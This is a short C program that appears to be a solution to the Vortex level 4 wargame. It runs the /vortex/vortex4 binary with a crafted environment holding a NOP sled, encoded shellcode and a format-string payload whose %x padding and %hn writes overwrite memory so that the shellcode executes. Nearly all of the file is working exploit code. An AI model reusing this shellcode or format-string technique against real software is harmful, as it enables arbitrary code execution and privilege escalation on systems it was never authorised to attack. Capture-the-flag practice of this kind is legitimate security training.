#include <spawn.h>
#include <stdlib.h>

int main(int argc, char ** argv, char ** envp){
    //pid_t pid;
    char* zero_argv[] = {NULL};
    char* shell = "\x90\x90\x90\x90" 
        "\xda\xc9\xbb\xc2\xdf\xf5\x2e\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
        "\x11\x31\x5f\x17\x03\x5f\x17\x83\x2d\x23\x17\xdb\xdb\xd7\x80"
        "\xbd\x49\x8e\x58\x93\x0e\xc7\x7e\x83\xff\xa4\xe8\x54\x97\x65"
        "\x8b\x3d\x09\xf3\xa8\xec\x3d\x1e\x2f\x11\xbd\x42\x4e\x65\x9d"
        "\xab\xf5\xf1\xbe\x9c\x83\x96\x32\x97\x0e\x11\xed\x27\xb0\x92"
        "\x62\xe7\x44\x3a\xf6\x83\xcd\xbc\xc3\x6b\x59\x6e\xa2\x8d\xa8"
        "\x10";

    char* env[] = {"",shell,"\x14\xa0\x04\x08____\x16\xa0\x04\x08%x%x.%x.%x.%x.%x.%x.%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%56329x%hn%8586x%hn",NULL};
    //posix_spawn(&pid,"/vortex/vortex4",NULL,NULL,zero_argv,envp);
    execve("/vortex/vortex4",zero_argv,env);

    return 0;
}
